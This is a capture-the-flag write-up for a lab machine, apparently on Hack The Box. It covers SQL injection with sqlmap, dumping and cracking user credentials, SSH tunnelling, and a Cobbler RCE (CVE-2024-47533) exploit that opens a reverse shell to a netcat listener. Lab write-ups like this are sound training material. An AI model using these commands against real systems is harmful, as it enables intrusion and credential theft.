# Cobblestone

<br>

**OS:** Linux (Debian)  
**Difficulty:** Medium  
**Date:** 5/3/26

<br>

<img width="2040" height="134" alt="Screenshot 2026-05-02 185723" src="https://github.com/user-attachments/assets/cbae9fbe-5bc8-424c-ad71-14005527b0d8" />

<br>

## Summary

Cobblestone is a Linux box hosting a Minecraft community website with multiple subdomains. The foothold comes from SQL injection in a voting app's suggest form, which lets you dump user credentials from the database. Cracking the admin's bcrypt hash gives SSH access as the cobble user. Privilege escalation exploits a Cobbler provisioning service running internally, using a known RCE vulnerability (CVE-2024-47533) to get a root shell.

<br>

<img width="1899" height="818" alt="Screenshot 2026-05-02 191258" src="https://github.com/user-attachments/assets/7924e3e0-ed69-4219-b85d-ba95aa3473c0" />

<br>

## Recon

<br>

Added the target to /etc/hosts:

```bash
sudo nano /etc/hosts
```

<br>

Started with an nmap scan:

```bash
nmap -sC -sV cobblestone.htb
```

Found two open ports:

Port 22 - SSH (OpenSSH 9.2)

Port 80 - Apache 2.4.62 serving cobblestone.htb

<br>

Ran gobuster on the main domain:

```bash
gobuster dir -u http://cobblestone.htb -w /usr/share/wordlists/dirb/common.txt
```

<br>

Curled index.php and found two subdomains in the HTML source: deploy.cobblestone.htb and vote.cobblestone.htb.

Added those to /etc/hosts:

```bash
echo "10.129.232.170 deploy.cobblestone.htb vote.cobblestone.htb" | sudo tee -a /etc/hosts
```

<br>

deploy.cobblestone.htb was an "under development" page but leaked potential usernames: Josh Madden, Sam Carlson, Katrina Robinson, Jeremy Brewer.

<br>

Ran gobuster on the vote subdomain with PHP extensions:

```bash
gobuster dir -u http://vote.cobblestone.htb -w /usr/share/wordlists/dirb/common.txt -x php
```

Found login.php, register.php, details.php, and suggest.php.

<br>

## Steps

### 1. Registered an account on the vote subdomain

The login page had a register tab. Created a test account and logged in. The app had a voting table for Minecraft servers and a suggest form that accepts a URL.

<br>

### 2. SQL injection on the suggest form

Tested the url parameter in the suggest form with sqlmap:

```bash
sqlmap -u "http://vote.cobblestone.htb/suggest.php" --data="url=test" --cookie="PHPSESSID=YOUR_SESSION" -p url --dbs --batch
```

Confirmed the url parameter was injectable. boolean-based blind, time-based blind, and UNION query.

Found two databases: information_schema and vote.

<br>

### 4. Dumped the users table

```bash
sqlmap -u "http://vote.cobblestone.htb/suggest.php" --data="url=test" --cookie="PHPSESSID=YOUR_SESSION" -p url -D vote --tables --batch
```

Found users and votes tables. Dumped users:

```bash
sqlmap -u "http://vote.cobblestone.htb/suggest.php" --data="url=test" --cookie="PHPSESSID=YOUR_SESSION" -p url -D vote -T users --dump --batch --no-cast
```

Got the admin user cobble@cobblestone.htb with a bcrypt hash.

<br>

### 6. Cracked the hash and SSH'd in

Cracked the bcrypt hash with john:

```bash
echo '$2y$10$redacted' > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Password: ixxxxxxxxxxxxxxxxxxxx

<br>

SSH'd in and grabbed the user flag:

```bash
ssh cobble@cobblestone.htb
cat ~/user.txt
```

<br>

### 8. Found Cobbler service for privilege escalation

Checked for internal services:

```bash
ss -tulnp
```

Found Cobbler running on 127.0.0.1:25151. Set up an SSH tunnel to reach it from PwnBox:

```bash
ssh -L 25151:127.0.0.1:25151 cobble@cobblestone.htb
```

<br>

### 9. Exploited Cobbler RCE (CVE-2024-47533)

The box had a restricted shell (rbash), so ran the exploit from PwnBox through the tunnel. The exploit abuses Cobbler's XML-RPC interface. It logs in anonymously, writes a malicious autoinstall template with a Cheetah template injection payload, creates a distro and profile pointing to it, then triggers the template rendering which executes the reverse shell.

<br>

Started a listener:

```bash
nc -lvnp 4444
```

<br>

Ran the exploit:

```bash
python3 exploit.py -t http://127.0.0.1:25151 -l YOUR_VPN_IP -p 4444 --payload bash
```

<br>

Got a root shell and grabbed the flag:

```bash
cat /root/root.txt
```

<br>

<img width="691" height="408" alt="Screenshot 2026-05-02 215750" src="https://github.com/user-attachments/assets/152f84d0-3403-42b6-9aea-e29aba6e249a" />


## Lessons Learned

- Always test all input fields for SQLi, not just URL parameters. The id parameter on details.php was clean but the url field on suggest.php was injectable.

- Bcrypt hashes are slow to crack. On PwnBox hardware it took a while with rockyou. Having multiple cracking tools ready (john, hashcat, online databases) saves time.

- After getting a user shell, always check for internal services with ss -tulnp.
  
- SSH tunneling lets you interact with internal services from your attack machine, which is important when the target has a restricted shell.

- Cobbler (CVE-2024-47533) allows unauthenticated RCE through its XML-RPC API via Cheetah template injection in autoinstall templates.

